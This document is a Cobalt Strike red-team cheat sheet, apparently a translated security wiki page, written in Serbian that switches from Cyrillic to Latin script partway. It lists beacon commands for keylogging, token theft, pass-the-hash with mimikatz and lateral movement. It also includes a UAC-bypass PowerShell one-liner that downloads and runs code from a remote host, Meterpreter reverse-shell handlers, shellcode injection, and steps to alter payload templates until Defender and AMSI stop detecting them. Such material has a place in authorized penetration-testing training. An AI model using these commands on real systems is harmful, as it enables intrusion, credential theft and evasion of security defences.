# Cobalt Strike

### Слушаоци

### C2 Слушаоци

`Cobalt Strike -> Слушаоци -> Додај/Уреди` затим можете изабрати где слушати, коју врсту бикона користити (http, dns, smb...) и више.

### Peer2Peer Слушаоци

Бикони ових слушаоца не морају директно комуницирати са C2, могу комуницирати преко других бикона.

`Cobalt Strike -> Слушаоци -> Додај/Уреди` затим морате изабрати TCP или SMB биконе

* **TCP бикон ће поставити слушаоца на изабраном порту**. За повезивање са TCP биконом користите команду `connect <ip> <port>` са другог бикона
* **smb бикон ће слушати на пипе са изабраним именом**. За повезивање са SMB биконом морате користити команду `link [target] [pipe]`.

### Генерише и хостује пакете

#### Генерише пакете у датотекама

`Напади -> Пакети ->`

* **`HTMLApplication`** за HTA датотеке
* **`MS Office Macro`** за офисни документ са макром
* **`Windows Executable`** за .exe, .dll или сервис .exe
* **`Windows Executable (S)`** за **stageless** .exe, .dll или сервис .exe (боље stageless него staged, мање IoC-ова)

#### Генерише и хостује пакете

`Напади -> Веб Drive-by -> Скриптована Испорука преко Веба (S)` Ово ће генерисати скрипту/извршни документ за преузимање бикона са Cobalt Strike у форматима као што су: bitsadmin, exe, powershell и python

#### Хостује пакете

Ако већ имате датотеку коју желите да хостујете на веб серверу, само идите на `Напади -> Веб Drive-by -> Хостуј датотеку` и изаберите датотеку за хостовање и конфигурацију веб сервера.

### Опције бикона

<pre class="language-bash"><code class="lang-bash"># Изврши локални .NET бинарни фајл
execute-assembly &#x3C;/path/to/executable.exe>

# Снимци екрана
printscreen    # Направи један снимак екрана помоћу PrintScr методе
screenshot     # Направи један снимак екрана
screenwatch    # Периодично прави снимке екрана
## Идите на Приказ -> Снимци екрана да их видите

# keylogger
keylogger [pid] [x86|x64]
## Приказ > Притиснуте тастере да видите притиснуте тастере

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Убаци акцију скенирања порта у други процес
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
# Увези Powershell модул
powershell-import C:\path\to\PowerView.ps1
powershell &#x3C;овде унесите powershell команду>

# Имитација корисника
## Генеришење токена са креденцијалима
make_token [DOMAIN\user] [password] #Креирај токен за имитирање корисника у мрежи
ls \\computer_name\c$ # Покушај коришћења генерисаног токена за приступ C$ на рачунару
rev2self # Престани користити токен генерисан са make_token
## Коришћење make_token генерише догађај 4624: Налог је успешно пријављен. Овај догађај је веома чест у Windows домену, али се може сужавати филтрирањем по типу пријаве. Као што је поменуто, користи LOGON32_LOGON_NEW_CREDENTIALS који је тип 9.

# UAC Bypass
elevate svc-exe &#x3C;слушаоц>
elevate uac-token-duplication &#x3C;слушаоц>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Укради токен из pid-а
## Као make_token, али краде токен из процеса
steal_token [pid] # Такође, ово је корисно за мрежне акције, а не локалне акције
## Из документације API-ја знамо да овај тип пријаве "омогућава позиваоцу да клонира свој тренутни токен". Зато Beacon исписује Impersonated &#x3C;current_username> - имитира наш клонирани токен.
ls \\computer_name\c$ # Покушај коришћења генерисаног токена за приступ C$ на рачунару
rev2self # Престани користити токен из steal_token

## Покрени процес са новим креденцијалима
spawnas [domain\username] [password] [listener] #Урадите то из директоријума са приступом за читање као: cd C:\
## Као make_token, ово ће генерисати Windows догађај 4624: Налог је успешно пријављен, али са типом пријаве 2 (LOGON32_LOGON_INTERACTIVE). Детаљно ће бити наведен позиваоц (TargetUserName) и имитирани корисник (TargetOutboundUserName).

## Убаци у процес
inject [pid] [x64|x86] [listener]
## Са аспекта ОпСек-а: Не врши убацивање између различитих платформи осим ако заиста морате (нпр. x86 -> x64 или x64 -> x86).

## Пренеси хеш
## Овај процес измене захтева патчовање меморије LSASS што је акција високог ризика, захтева привилегије локалног администратора и није све то изводљиво ако је омогућено Заштићено Процесно Светло (PPL).
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Пренеси хеш преко mimikatz-a
mimikatz sekurlsa::pth /user:&#x3C;username> /domain:&#x3C;DOMAIN> /ntlm:&#x3C;NTLM HASH> /run:"powershell -w hidden"
## Без /run, mimikatz покреће cmd.exe, ако користите као корисник са Радном површином, видеће шел (ако користите као СИСТЕМ, све је у реду)
steal_token &#x3C;pid> #Укради токен из процеса који је креирао mimikatz

## Пренеси тикет
## Захтевај тикет
execute-assembly C:\path\Rubeus.exe asktgt /user:&#x3C;username> /domain:&#x3C;domain>
### Kreiranje nove sesije za prijavljivanje, zabeležite luid i processid
execute-assembly C:\putanja\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Ubacite karticu u generisanu sesiju za prijavljivanje
execute-assembly C:\putanja\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Na kraju, ukradite token iz tog novog procesa
steal_token &#x3C;pid>

# Lateralno kretanje
## Ako je token kreiran, biće korišćen
jump [metoda] [cilj] [slušalac]
## Metode:
## psexec                    x86   Koristi uslugu za pokretanje artefakta Service EXE
## psexec64                  x64   Koristi uslugu za pokretanje artefakta Service EXE
## psexec_psh                x86   Koristi uslugu za pokretanje PowerShell jednolinije
## winrm                     x86   Pokreće PowerShell skriptu putem WinRM-a
## winrm64                   x64   Pokreće PowerShell skriptu putem WinRM-a

remote-exec [metoda] [cilj] [komanda]
## Metode:
<strong>## psexec                          Daljinsko izvršavanje putem Service Control Manager-a
</strong>## winrm                           Daljinsko izvršavanje putem WinRM-a (PowerShell)
## wmi                             Daljinsko izvršavanje putem WMI-a

## Da biste izvršili beacon sa wmi (nije u jump komandi), samo otpremite beacon i izvršite ga
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Prosledi sesiju Metasploitu - Putem slušaoca
## Na Metasploit hostu
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## Na Cobalt: Slušaoci > Dodaj i postavi Payload na Foreign HTTP. Postavi Host na 10.10.5.120, Port na 8080 i klikni Sačuvaj.
beacon> spawn metasploit
## Možete spawn-ovati samo x86 Meterpreter sesije sa foreign slušaocem.

# Prosledi sesiju Metasploitu - Putem ubrizgavanja shellcode-a
## Na Metasploit hostu
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=&#x3C;IP> LPORT=&#x3C;PORT> -f raw -o /tmp/msf.bin
## Pokreni msfvenom i pripremi multi/handler slušaoca

## Kopiraj bin fajl na Cobalt Strike host
ps
shinject &#x3C;pid> x64 C:\Payloads\msf.bin #Ubrizgaj metasploit shellcode u x64 proces

# Prosledi metasploit sesiju Cobalt Strike-u
## Generiši stageless Beacon shellcode, idi na Attacks > Packages > Windows Executable (S), izaberi željeni slušalac, izaberi Raw kao Output tip i izaberi Use x64 payload.
## Koristi post/windows/manage/shellcode_inject u metasploit-u da ubrizgaš generisani cobalt strike shellcode


# Pivoting
## Otvori socks proxy na teamserveru
beacon> socks 1080

# SSH konekcija
beacon> ssh 10.10.17.12:22 korisničko_ime lozinka
</code></pre>

## Izbegavanje AV-a

### Artifact Kit

Obično u `/opt/cobaltstrike/artifact-kit` možete pronaći kod i prekompilirane šablone (u `/src-common`) payloada koje će cobalt strike koristiti za generisanje binarnih beacona.

Koristeći [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) sa generisanim backdoorom (ili samo sa kompiliranim šablonom) možete pronaći šta pokreće defender. Obično je to string. Stoga jednostavno izmenite kod koji generiše backdoor tako da taj string ne bude prisutan u finalnom binarnom fajlu.

Nakon izmene koda, pokrenite `./build.sh` iz istog direktorijuma i kopirajte `dist-pipe/` folder na Windows klijentu u `C:\Tools\cobaltstrike\ArtifactKit`.

```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```

Ne zaboravite da učitate agresivni skript `dist-pipe\artifact.cna` kako biste Cobalt Strike-u pokazali da koristi resurse sa diska koje želimo, a ne one koji su učitani.

### Resource Kit

Folder ResourceKit sadrži predloške za skriptne payload-e Cobalt Strike-a, uključujući PowerShell, VBA i HTA.

Korišćenjem [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) sa predlošcima možete pronaći šta se ne sviđa zaštitniku (u ovom slučaju AMSI) i izmeniti to:

```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```

Modifikovanjem detektovanih linija može se generisati šablon koji neće biti uhvaćen.

Ne zaboravite da učitate agresivni skriptu `ResourceKit\resources.cna` kako biste Cobalt Strike-u pokazali da koristite resurse sa diska koje želite, a ne one koji su učitani.

```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```
